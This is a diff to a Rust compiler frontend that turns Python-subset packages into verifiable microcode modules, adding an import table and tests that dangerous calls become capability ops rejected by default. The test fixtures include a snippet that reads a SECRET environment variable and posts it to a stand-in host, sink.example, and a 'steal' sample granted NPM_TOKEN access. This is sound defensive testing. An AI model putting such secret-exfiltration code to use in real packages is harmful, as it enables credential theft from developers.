@@ -49,7 +49,8 @@
 //! Every produced `Module` is expected to pass [`omc_verify::verify_module`]
 //! against the importer's policy before it links or runs.
 
-use omc_format::{BehaviorType, Module};
+use omc_format::BehaviorType;
+pub use omc_format::{CompileOutput, ImportSpec};
 
 mod lexer;
 mod lower;
@@ -89,17 +90,20 @@ impl std::fmt::Display for FrontendError {
 
 impl std::error::Error for FrontendError {}
 
-/// Lower a Python-subset source string into an OSS Microcode [`Module`].
+/// Lower a Python-subset source string into an OSS Microcode [`CompileOutput`]:
+/// the produced [`omc_format::Module`] plus its ordered import table, where
+/// `imports[i]` is the [`ImportSpec`] targeted by `Op::CallImport(i)`.
 ///
 /// Pure/offline: the source is hand-lexed and parsed, never executed. Any
 /// construct outside the supported subset is a hard [`FrontendError`]
 /// (deny-by-default); a dangerous host call is lowered to an explicit capability
 /// op, never to a benign op. The returned module is expected to pass
 /// [`omc_verify::verify_module`] before it links or runs.
-pub fn compile(source: &str, meta: &PackageMeta) -> Result<Module, FrontendError> {
+pub fn compile(source: &str, meta: &PackageMeta) -> Result<CompileOutput, FrontendError> {
     let tokens = lexer::lex(source)?;
     let parsed = parser::parse(&tokens)?;
-    lower::lower(&parsed, meta)
+    let (module, imports) = lower::lower(&parsed, meta)?;
+    Ok(CompileOutput { module, imports })
 }
 
 #[cfg(test)]
@@ -147,7 +151,9 @@ def is_odd(n):
     #[test]
     fn is_odd_lowers_verifies_pure_and_runs() {
         let meta = pure_meta("is-odd", "1.0.0");
-        let module = compile(IS_ODD_SRC, &meta).expect("is_odd should compile");
+        let module = compile(IS_ODD_SRC, &meta)
+            .expect("is_odd should compile")
+            .module;
 
         assert_eq!(module.id, "pypi:is-odd@1.0.0");
         assert_eq!(module.declared_behavior, BehaviorType::Pure);
@@ -200,7 +206,9 @@ def steal():
     #[test]
     fn exfil_lowers_to_capabilities_and_is_rejected_by_default() {
         let meta = host_meta("telemetry-helper", "0.0.1");
-        let module = compile(EXFIL_SRC, &meta).expect("exfil should compile");
+        let module = compile(EXFIL_SRC, &meta)
+            .expect("exfil should compile")
+            .module;
 
         let entry = module.entry().expect("entry function");
         // The dangerous behavior compiled into explicit capability ops.
@@ -243,7 +251,9 @@ def steal():
     #[test]
     fn exfil_accepted_only_when_flow_is_explicitly_granted() {
         let meta = host_meta("telemetry-helper", "0.0.1");
-        let module = compile(EXFIL_SRC, &meta).expect("exfil should compile");
+        let module = compile(EXFIL_SRC, &meta)
+            .expect("exfil should compile")
+            .module;
 
         let granted = Policy::pure()
             .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
@@ -267,7 +277,7 @@ import os
 def home():
     return os.environ['HOME']
 ";
-        let module = compile(src, &host_meta("p", "1.0.0")).unwrap();
+        let module = compile(src, &host_meta("p", "1.0.0")).unwrap().module;
         assert!(module
             .entry()
             .unwrap()
@@ -282,7 +292,7 @@ def home():
 def load():
     return open('config.ini').read()
 ";
-        let module = compile(src, &host_meta("p", "1.0.0")).unwrap();
+        let module = compile(src, &host_meta("p", "1.0.0")).unwrap().module;
         assert!(module
             .entry()
             .unwrap()
@@ -312,7 +322,7 @@ import subprocess
 def go():
     return subprocess.run('ls')
 ";
-        let module = compile(src, &host_meta("p", "1.0.0")).unwrap();
+        let module = compile(src, &host_meta("p", "1.0.0")).unwrap().module;
         assert!(module
             .entry()
             .unwrap()
@@ -334,7 +344,7 @@ def classify(n):
     else:
         return 1
 ";
-        let module = compile(src, &pure_meta("classify", "1.0.0")).unwrap();
+        let module = compile(src, &pure_meta("classify", "1.0.0")).unwrap().module;
         omc_verify::verify_module(&module, &Policy::pure()).unwrap();
 
         let run = |n: i64| -> Value {
@@ -361,7 +371,7 @@ def sum_to(n):
         i = i + 1
     return acc
 ";
-        let module = compile(src, &pure_meta("sum-to", "1.0.0")).unwrap();
+        let module = compile(src, &pure_meta("sum-to", "1.0.0")).unwrap().module;
         omc_verify::verify_module(&module, &Policy::pure()).unwrap();
 
         let mut cell = Cell::new(1, module, Policy::pure());
@@ -380,7 +390,7 @@ def helper(x):
 def main(x):
     return helper(x)
 ";
-        let module = compile(src, &pure_meta("siblings", "1.0.0")).unwrap();
+        let module = compile(src, &pure_meta("siblings", "1.0.0")).unwrap().module;
         omc_verify::verify_module(&module, &Policy::pure()).unwrap();
         // Entry is the FIRST function (helper); call main explicitly via id 1.
         let main = module.function(1).expect("main exists");
@@ -403,13 +413,99 @@ from leftpad import leftpad
 def pad(s):
     return leftpad(s)
 ";
-        let module = compile(src, &pure_meta("uses-leftpad", "1.0.0")).unwrap();
-        assert!(module
+        let output = compile(src, &pure_meta("uses-leftpad", "1.0.0")).unwrap();
+        assert!(output
+            .module
             .entry()
             .unwrap()
             .code
             .iter()
             .any(|op| matches!(op, Op::CallImport(0))));
+        // The import table surfaces the package and the named member that
+        // `CallImport(0)` resolves to: `from leftpad import leftpad`.
+        assert_eq!(
+            output.imports,
+            vec![ImportSpec {
+                package: "leftpad".to_owned(),
+                member: Some("leftpad".to_owned()),
+            }]
+        );
+    }
+
+    #[test]
+    fn import_module_alias_surfaces_spec_with_no_member() {
+        // `import leftpad as lp` binds a whole-module callable; its ImportSpec
+        // carries the dotted package name and no member.
+        let src = "\
+import leftpad as lp
+
+def pad(s):
+    return lp(s)
+";
+        let output = compile(src, &pure_meta("uses-leftpad", "1.0.0")).unwrap();
+        assert!(output
+            .module
+            .entry()
+            .unwrap()
+            .code
+            .iter()
+            .any(|op| matches!(op, Op::CallImport(0))));
+        assert_eq!(
+            output.imports,
+            vec![ImportSpec {
+                package: "leftpad".to_owned(),
+                member: None,
+            }]
+        );
+    }
+
+    #[test]
+    fn import_table_is_ordered_by_import_id_and_excludes_capability_modules() {
+        // `os` lowers to capability ops, never a CallImport, so it must NOT
+        // occupy an ImportId. The two real cross-module imports keep positional
+        // ids 0 and 1 even though a capability import precedes one of them.
+        let src = "\
+import os
+from left import lpad
+from right import rpad
+
+def go(s):
+    token = os.getenv('T')
+    return lpad(rpad(s))
+";
+        let output = compile(src, &host_meta("uses-both", "1.0.0")).unwrap();
+        assert_eq!(
+            output.imports,
+            vec![
+                ImportSpec {
+                    package: "left".to_owned(),
+                    member: Some("lpad".to_owned()),
+                },
+                ImportSpec {
+                    package: "right".to_owned(),
+                    member: Some("rpad".to_owned()),
+                },
+            ]
+        );
+        // `lpad` -> CallImport(0), `rpad` -> CallImport(1); os.getenv -> EnvRead.
+        let code = &output.module.entry().unwrap().code;
+        assert!(code.iter().any(|op| matches!(op, Op::CallImport(0))));
+        assert!(code.iter().any(|op| matches!(op, Op::CallImport(1))));
+        assert!(code
+            .iter()
+            .any(|op| matches!(op, Op::Cap(CapOp::EnvRead { name }) if name == "T")));
+    }
+
+    #[test]
+    fn capability_only_imports_produce_empty_import_table() {
+        // A package that imports only capability-family modules has no
+        // cross-module imports: the surfaced table is empty.
+        let output = compile(EXFIL_SRC, &host_meta("telemetry-helper", "0.0.1")).unwrap();
+        assert!(
+            output.imports.is_empty(),
+            "capability modules must not appear in the import table, got {:?}",
+            output.imports
+        );
     }
 
     #[test]
@@ -424,7 +520,7 @@ def go():
     token = os.getenv('SECRET')
     return requests.post('https://sink.example/x', token)
 ";
-        let module = compile(src, &host_meta("p", "1.0.0")).unwrap();
+        let module = compile(src, &host_meta("p", "1.0.0")).unwrap().module;
         let capped = Policy::pure()
             .allow_capability(Capability::EnvRead("SECRET".to_owned()))
             .allow_capability(Capability::HttpHost("sink.example".to_owned()));
